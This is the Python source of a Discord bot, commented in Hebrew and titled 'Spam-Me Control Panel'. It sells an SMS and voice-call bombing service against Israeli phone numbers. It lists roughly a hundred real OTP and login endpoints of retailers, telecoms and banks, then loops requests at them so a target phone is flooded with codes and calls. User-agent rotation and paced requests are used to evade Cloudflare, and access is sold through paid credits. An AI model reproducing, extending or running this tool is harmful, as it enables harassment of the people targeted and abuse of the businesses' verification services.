import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging
import json
import time

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

MONGO_URI = os.getenv("MONGO_URI")
TOKEN = os.getenv("DISCORD_TOKEN")

if not MONGO_URI or not TOKEN:
    logging.error("❌ Missing environment variables!")
    sys.exit(1)

try:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["cyberbot"]
    users_col = db["users"]
    logging.info("✅ Connected to MongoDB on Railway")
except Exception as e:
    logging.error(f"❌ Failed to connect to MongoDB: {e}")
    sys.exit(1)

# ========== רול מורשה ==========
ALLOWED_ROLE_ID = 1480762750052601886

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        super().__init__(command_prefix='!', intents=intents)
        self.start_time = datetime.now()
        self.active_attacks = {}
        self.last_request = {}
    
    async def setup_hook(self):
        await self.tree.sync()
        logging.info(f"🔱 OMNI-TOTAL-WAR BOT IS ONLINE")

bot = CyberBot()

# ========== בדיקת רול - פונקציה רגילה, לא דקורטור ==========
async def check_allowed_role(interaction: discord.Interaction) -> bool:
    """בדיקה אם למשתמש יש את הרול המורשה"""
    if not interaction.guild:
        await interaction.response.send_message("❌ הפקודה זמינה רק בשרת!", ephemeral=True)
        return False
    
    # אם זה המפעיל של הבוט - תמיד לאפשר
    if interaction.user.id == bot.owner_id:
        return True
    
    member = interaction.user
    if isinstance(member, discord.Member):
        if any(role.id == ALLOWED_ROLE_ID for role in member.roles):
            return True
    
    await interaction.response.send_message(f"❌ רק משתמשים עם רול <@&{ALLOWED_ROLE_ID}> יכולים להשתמש בפקודה זו!", ephemeral=True)
    return False

# ========== USER AGENTS ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/145.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
]

# ========== APIS (כל ה-120) ==========
MAGENTO_APIS = [
    {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Gali", "url": "https://www.gali.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Timberland", "url": "https://www.timberland.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Onot", "url": "https://www.onot.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "magento"},
    {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "type": "magento"},
    {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "CrazyLine", "url": "https://www.crazyline.com/customer/ajax/post/", "type": "magento"},
    {"name": "Adika", "url": "https://www.adikastyle.com/customer/ajax/post/", "type": "magento"},
    {"name": "Weshoes", "url": "https://www.weshoes.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "NineWest", "url": "https://www.ninewest.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Fix", "url": "https://www.fixunderwear.com/customer/ajax/post/", "type": "magento"},
    {"name": "Intima", "url": "https://www.intima-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Golf", "url": "https://www.golf-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "KiwiKids", "url": "https://www.kiwi-kids.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Story", "url": "https://www.storyonline.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Nautica", "url": "https://www.nautica.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "LeeCooper", "url": "https://www.lee-cooper.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Nike", "url": "https://www.nike.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Adidas", "url": "https://www.adidas.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Puma", "url": "https://www.puma.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "GolfKids", "url": "https://www.golfkids.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Steimatzky", "url": "https://www.steimatzky.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "StepIn", "url": "https://www.stepin.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Renoir", "url": "https://www.renuar.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Laline", "url": "https://www.laline.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Gefen", "url": "https://www.gefen.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Avramito", "url": "https://www.avramito.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "RedHot", "url": "https://www.redhot.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Buffalo", "url": "https://www.buffalo.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "FoxHome", "url": "https://www.foxhome.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "TerminalX", "url": "https://www.terminalx.com/customer/ajax/post/", "type": "magento"},
    {"name": "AmericanVintage", "url": "https://www.american-vintage.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Lacoste", "url": "https://www.lacoste.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Tommy", "url": "https://www.tommyhilfiger.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "CalvinKlein", "url": "https://www.calvinklein.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "UnderArmour", "url": "https://www.underarmour.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Skechers", "url": "https://www.skechers.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Columbia", "url": "https://www.columbia.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Merrell", "url": "https://www.merrell.co.il/customer/ajax/post/", "type": "magento"},
]

SMS_APIS = [
    {"name": "Cellcom", "url": "https://www.cellcom.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "CellcomOTP", "url": "https://digital-api.cellcom.co.il/api/otp/ResendLoginStep1", "method": "PUT", "headers": {"clientid": "CellcomWebApp"}, "data": {"phone": "PHONE"}},
    {"name": "Partner", "url": "https://www.partner.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Pelephone", "url": "https://www.pelephone.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "Hot", "url": "https://www.hotmobile.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "019", "url": "https://019sms.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "012", "url": "https://www.012.net.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "Bezeq", "url": "https://www.bezeq.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "Golan", "url": "https://www.golantelecom.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "019mobile", "url": "https://019mobile.co.il/userarea/ajax/api/", "type": "form", "data": "request=login&action=firstLogin&data_arr%5Baction%5D=2&data_arr%5Bcontact%5D=PHONE"},
    {"name": "Shufersal", "url": "https://www.shufersal.co.il/api/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
    {"name": "RamiLevi", "url": "https://www.rami-levy.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "Victory", "url": "https://www.victory.co.il/api/auth/otp", "data": {"phone": "PHONE"}},
    {"name": "SuperPharm", "url": "https://www.super-pharm.co.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "GoodPharm", "url": "https://www.goodpharm.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "Be", "url": "https://www.be.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "Zap", "url": "https://www.zap.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "10bis", "url": "https://www.10bis.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Wolt", "url": "https://www.wolt.com/api/v1/verify", "data": {"phone": "PHONE"}},
    {"name": "Dominos", "url": "https://www.dominos.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "McDonalds", "url": "https://www.mcdonalds.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "BurgerKing", "url": "https://www.burgerking.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "KFC", "url": "https://www.kfc.co.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "PizzaHut", "url": "https://www.pizza-hut.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Yad2", "url": "https://www.yad2.co.il/api/auth/register", "data": {"phone": "PHONE", "action": "send_sms"}},
    {"name": "Pango", "url": "https://api.pango.co.il/auth/otp", "data": {"phoneNumber": "PHONE_RAW"}},
    {"name": "Ivory", "url": "https://www.ivory.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "data": {"value": "PHONE", "type": "phone", "projectId": "1"}},
    {"name": "Mishloha", "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "data": {"phoneNumber": "PHONE"}},
    {"name": "Hopon", "url": "https://api.hopon.co.il/v0.15/1/isr/users", "data": {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "phone": "PHONE", "phoneCall": False}},
    {"name": "Gett", "url": "https://www.gett.com/il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "Moovit", "url": "https://moovit.com/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "Isracart", "url": "https://www.isracart.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Bit", "url": "https://www.bit.co.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "Ikea", "url": "https://www.ikea.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "HomeCenter", "url": "https://www.home-center.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "Ace", "url": "https://www.ace.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "OfficeDepot", "url": "https://www.office-depot.co.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "BurgerAnch", "url": "https://app.burgeranch.co.il/_a/aff_otp_auth", "type": "form", "data": "phone=PHONE"},
]

VOICE_APIS = [
    {"name": "Hapoalim", "url": "https://login.bankhapoalim.co.il/api/otp/send", "data": {"phone": "PHONE", "sendVoice": True}},
    {"name": "Leumi", "url": "https://api.leumi.co.il/api/otp/send", "data": {"phone": "PHONE", "voice": True}},
    {"name": "Discount", "url": "https://api.discountbank.co.il/auth/otp", "data": {"phone": "PHONE_RAW", "method": "voice"}},
    {"name": "Mizrahi", "url": "https://api.mizrahi-tefahot.co.il/auth/otp", "data": {"phone": "PHONE", "type": "voice"}},
    {"name": "Beinleumi", "url": "https://api.beinleumi.co.il/auth/send-otp", "data": {"phone": "PHONE", "channel": "voice"}},
    {"name": "Union", "url": "https://api.unionbank.co.il/auth/otp/voice", "data": {"phone": "PHONE"}},
    {"name": "Jerusalem", "url": "https://api.bank-jerusalem.co.il/auth/otp", "data": {"phone": "PHONE", "voice": True}},
    {"name": "CellcomVoice", "url": "https://digital-api.cellcom.co.il/api/otp/VoiceCall", "data": {"phone": "PHONE"}},
    {"name": "PartnerVoice", "url": "https://www.partner.co.il/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "PelephoneVoice", "url": "https://www.pelephone.co.il/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "HotVoice", "url": "https://www.hotmobile.co.il/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "BezeqVoice", "url": "https://www.bezeq.co.il/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "ShufersalVoice", "url": "https://www.shufersal.co.il/api/v1/auth/voice", "data": {"phone": "PHONE_RAW"}},
    {"name": "RamiLeviVoice", "url": "https://www.rami-levy.co.il/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "PangoVoice", "url": "https://api.pango.co.il/auth/voice", "data": {"phoneNumber": "PHONE_RAW"}},
    {"name": "GettVoice", "url": "https://www.gett.com/il/api/voice", "data": {"phone": "PHONE"}},
]

QUICK_LOGIN_APIS = [
    {"name": "Quick247", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-twentyfourseven-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickRenuar", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-renuar-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickAldo", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-aldoshoes-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickBillabong", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-billabong-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickSacks", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-sacks-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickSteve", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-stevemadden-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickLogin", "url": "https://quick-login.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "QuickAuth", "url": "https://login.quick-login.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "QuickMagento", "url": "https://magento.quick-login.co.il/rest/V1/guest-carts", "data": {"phone": "PHONE"}},
]

APIS = MAGENTO_APIS + SMS_APIS + VOICE_APIS + QUICK_LOGIN_APIS
print(f"📊 טענתי {len(APIS)} APIs!")

# ========== פונקציות שליחה ==========
async def send_magento(session, url, phone_raw, domain_delays):
    domain = url.split('/')[2]
    last_time = domain_delays.get(domain, 0)
    now = time.time()
    if now - last_time < 2:
        await asyncio.sleep(2 - (now - last_time))
    
    data = {
        "type": "login",
        "telephone": phone_raw,
        "bot_validation": 1,
    }
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest"
    }
    try:
        async with session.post(url, data=data, headers=headers, timeout=10) as resp:
            domain_delays[domain] = time.time()
            return resp.status in [200, 201, 202]
    except:
        return False

async def send_api(session, api, phone, phone_raw, phone_intl, domain_delays):
    domain = api["url"].split('/')[2]
    last_time = domain_delays.get(domain, 0)
    now = time.time()
    if now - last_time < 2:
        await asyncio.sleep(2 - (now - last_time))
    
    try:
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        if api.get("type") == "form":
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            data = api["data"].replace("PHONE", phone)
            async with session.post(api["url"], data=data, headers=headers, timeout=10) as resp:
                domain_delays[domain] = time.time()
                return resp.status in [200, 201, 202, 204]
        else:
            headers["Content-Type"] = "application/json"
            data_str = json.dumps(api["data"])
            data_str = data_str.replace("PHONE", phone).replace("PHONE_RAW", phone_raw).replace("PHONE_INTL", phone_intl)
            data = json.loads(data_str)
            method = api.get("method", "POST")
            async with session.request(method, api["url"], json=data, headers=headers, timeout=10) as resp:
                domain_delays[domain] = time.time()
                return resp.status in [200, 201, 202, 204]
    except:
        return False

# ========== מתקפה ==========
async def smart_attack(phone, credits, user_id, interaction, attack_id):
    phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
    phone_intl = f"+972{phone_raw}"
    
    duration_seconds = credits * 45
    duration_mins = duration_seconds // 60
    remaining_seconds = duration_seconds % 60
    
    end_time = datetime.now() + timedelta(seconds=duration_seconds)
    
    await interaction.followup.send(
        f"🎯 **SMART SPAM STARTED**\n📱 {phone}\n⏱️ {credits} טוקנים = {duration_mins}ד {remaining_seconds}ש\n🎯 {len(APIS)} APIs",
        ephemeral=True
    )
    
    sessions = [aiohttp.ClientSession() for _ in range(3)]
    total_sent = 0
    last_report = 0
    domain_delays = {}
    
    try:
        while datetime.now() < end_time:
            if attack_id in bot.active_attacks and not bot.active_attacks[attack_id]:
                break
            
            tasks = []
            for session in sessions:
                for api in APIS:
                    if api.get("type") == "magento":
                        tasks.append(send_magento(session, api["url"], phone_raw, domain_delays))
                    else:
                        tasks.append(send_api(session, api, phone, phone_raw, phone_intl, domain_delays))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            total_sent += sum(1 for r in results if r is True)
            
            elapsed = int((datetime.now() - (end_time - timedelta(seconds=duration_seconds))).total_seconds())
            if elapsed - last_report >= 60:
                last_report = elapsed
                remaining = duration_seconds - elapsed
                rate = total_sent // (elapsed // 60) if elapsed > 60 else 0
                await interaction.followup.send(f"📊 {elapsed//60}ד: {total_sent} | {rate}/דקה", ephemeral=True)
            
            await asyncio.sleep(random.uniform(1, 2))
    
    finally:
        for session in sessions:
            await session.close()
    
    if attack_id in bot.active_attacks:
        del bot.active_attacks[attack_id]
    
    await interaction.followup.send(f"✅ **FINISHED**\n📊 סה\"כ: {total_sent}", ephemeral=True)

# ========== פקודות - עם בדיקת רול בפקודה עצמה ==========
@bot.tree.command(name="check", description="בדוק APIs (צוות)")
async def check_command(interaction: discord.Interaction):
    if not await check_allowed_role(interaction):
        return
    
    await interaction.response.send_message("🔍 בודק 20 APIs...", ephemeral=True)
    
    test_phone = "972501234567"
    test_raw = "0501234567"
    test_intl = "+972501234567"
    domain_delays = {}
    
    working = []
    
    async with aiohttp.ClientSession() as session:
        for api in APIS[:20]:
            if api.get("type") == "magento":
                success = await send_magento(session, api["url"], test_raw, domain_delays)
            else:
                success = await send_api(session, api, test_phone, test_raw, test_intl, domain_delays)
            if success:
                working.append(api["name"])
            await asyncio.sleep(1)
    
    await interaction.followup.send(f"✅ **{len(working)}** עובדים", ephemeral=True)

@bot.tree.command(name="add_tokens", description="הוסף טוקנים (צוות)")
async def add_tokens(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not await check_allowed_role(interaction):
        return
    
    user_id = str(member.id)
    await users_col.update_one(
        {"user_id": user_id},
        {"$inc": {"tokens": amount}},
        upsert=True
    )
    await interaction.response.send_message(f"✅ הוספת {amount} טוקנים ל{member.mention}", ephemeral=True)

@bot.tree.command(name="panel", description="פתח את פאנל השליטה")
async def panel(interaction: discord.Interaction):
    if not await check_allowed_role(interaction):
        return
    
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    tokens = user_doc.get("tokens", 0) if user_doc else 0
    
    embed = discord.Embed(
        title="Spam-Me Control Panel",
        description=f"Use the buttons below to interact with the bot.\n\n🛡️ **מוגן נגד Cloudflare** - דיליי חכם",
        color=0x2b2d31
    )
    embed.add_field(name="📱 **Smart Spam**", value="SMS & Calls (costs credits)", inline=False)
    embed.add_field(name="💰 **Your Credits**", value=f"**{tokens}** credits", inline=True)
    embed.add_field(name="💎 **1 Credit**", value="45 seconds", inline=True)
    embed.set_footer(text=f"{len(APIS)} APIs • מוגן Cloudflare")
    
    view = MainPanel()
    await interaction.response.send_message(embed=embed, view=view)

# ========== VIEW ==========
class SpamModal(ui.Modal, title="Start Smart Spam"):
    phone = ui.TextInput(label="Target Phone Number *", placeholder="054XXXXXXXX")
    credits = ui.TextInput(label="Credits to use (max 100) *", placeholder="e.g. 5")

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone.value.strip()
        credits_str = self.credits.value.strip()
        
        if not phone.isdigit() or len(phone) < 9:
            await interaction.response.send_message("❌ מספר טלפון לא תקין", ephemeral=True)
            return
        
        if not phone.startswith("05") and not phone.startswith("972"):
            await interaction.response.send_message("❌ מספר חייב להתחיל ב-05 או 972", ephemeral=True)
            return
        
        try:
            credits = int(credits_str)
            if credits < 1 or credits > 100:
                await interaction.response.send_message("❌ יש להזין 1-100 טוקנים", ephemeral=True)
                return
        except:
            await interaction.response.send_message("❌ מספר לא תקין", ephemeral=True)
            return
        
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        
        if not user_doc:
            await users_col.insert_one({"user_id": user_id, "tokens": 0})
            user_doc = {"tokens": 0}
        
        if user_doc.get("tokens", 0) < credits:
            await interaction.response.send_message(f"❌ אין לך מספיק טוקנים! יש לך {user_doc.get('tokens', 0)}", ephemeral=True)
            return
        
        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -credits}})
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        bot.active_attacks[attack_id] = True
        
        duration_seconds = credits * 45
        duration_mins = duration_seconds // 60
        remaining_sec = duration_seconds % 60
        
        await interaction.response.send_message(
            f"✅ **ACTIVATED**\n📱 {phone}\n🎯 {credits} טוקנים = {duration_mins}ד {remaining_sec}ש\n💎 נותרו: {user_doc['tokens'] - credits}",
            ephemeral=True
        )
        
        asyncio.create_task(smart_attack(phone, credits, user_id, interaction, attack_id))

class MainPanel(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)
    
    @discord.ui.button(label="📱 Smart Spam", style=discord.ButtonStyle.danger, emoji="💣")
    async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(SpamModal())
    
    @discord.ui.button(label="💰 My Credits", style=discord.ButtonStyle.secondary, emoji="💎")
    async def credits_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        tokens = user_doc.get("tokens", 0) if user_doc else 0
        await interaction.response.send_message(f"💎 יש לך {tokens} טוקנים", ephemeral=True)
    
    @discord.ui.button(label="🛒 Buy Credits", style=discord.ButtonStyle.primary, emoji="💳")
    async def buy_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(
            title="🛒 Buy Credits",
            description="To purchase credits, please visit our website:\nhttps://your-website.com/buy",
            color=0x5865f2
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

if __name__ == "__main__":
    print(f"🎯 פאנל Spam-Me מוכן עם {len(APIS)} APIs!")
    print(f"🔒 רול מורשה: {ALLOWED_ROLE_ID}")
    print(f"⏱️ 1 טוקן = 45 שניות")
    bot.run(TOKEN)
